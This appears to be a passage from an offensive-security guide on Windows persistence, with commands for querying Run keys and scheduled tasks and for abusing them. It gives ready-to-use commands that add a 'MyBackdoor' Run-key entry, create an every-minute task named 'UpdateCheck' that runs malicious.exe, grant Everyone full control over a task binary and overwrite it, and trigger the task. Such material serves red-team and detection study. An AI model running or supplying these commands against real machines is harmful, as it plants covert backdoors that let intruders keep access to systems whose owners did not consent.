### References

- [LOLBAS Project](https://lolbas-project.github.io/#)
- [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [Microsoft Docs: Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)

---
## Registry-Based Persistence

Windows registry keys can be modified to execute a payload every time the system starts or a user logs in.

### Identifying Auto-Execution Registry Keys

The following registry keys can be leveraged for persistence:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

If any of these paths are writable, a malicious binary can be inserted for execution.

### Creating a Registry Key for Persistence

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

This command ensures `backdoor.exe` will execute upon user login.

---
## Scheduled Task-Based Persistence

Scheduled tasks can be abused to execute a malicious payload at specific times or system events.

### Enumerating Scheduled Tasks

To list all scheduled tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for tasks running as privileged users or those pointing to writable paths.

### Creating a Malicious Scheduled Task

A non-privileged user can create a task that executes a payload every minute:

```powershell
schtasks /create /sc minute /mo 1 /tn "UpdateCheck" /tr "C:\Users\Public\malicious.exe" /F
```

This will execute `malicious.exe` every minute.

### Modifying an Existing Scheduled Task

If a scheduled task is writable, replace its target binary:

```powershell
icacls C:\Path\To\TaskBinary.exe /grant Everyone:F
copy malicious.exe C:\Path\To\TaskBinary.exe
```

Once the task executes, the malicious binary will run.

### Triggering a Scheduled Task for Immediate Execution

```powershell
schtasks /run /tn "UpdateCheck"
```

This manually triggers the task without waiting for the next scheduled interval.